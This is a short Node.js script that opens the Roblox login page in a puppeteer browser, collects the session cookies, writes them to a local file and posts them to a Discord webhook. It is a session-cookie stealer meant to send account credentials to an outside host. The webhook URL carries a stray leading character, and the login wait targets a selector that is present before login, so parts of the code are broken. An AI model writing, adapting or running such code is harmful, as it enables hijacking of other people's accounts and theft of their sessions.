const axios = require('axios');
const puppeteer = require('puppeteer');
const fs = require('fs');

const webhookUrl = 'Yhttps://discordapp.com/api/webhooks/1508814909008515094/K6_XrOoEL_GXG1UJ2Rf9KI_1b76AgKZ7lAM_Nt-WSZkW8mjKxzCCFxavsTiG4ylQyPGL'; // Replace with your Discord webhook URL

async function captureCookies() {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    // Navigate to the Roblox login page
    await page.goto('https://www.roblox.com/login');

    // Wait for the user to log in
    await page.waitForSelector('#login-button');

    // Capture cookies
    const cookies = await page.cookies();

    // Save cookies to a notepad file
    fs.writeFileSync('cookies.txt', JSON.stringify(cookies, null, 2));

    // Send the cookies to Discord
    await axios.post(webhookUrl, {
        content: `**Roblox Cookies:**\n\`\`\`${JSON.stringify(cookies, null, 2)}\`\`\``,
    });

    // Close the browser
    await browser.close();
}

captureCookies().catch(console.error);
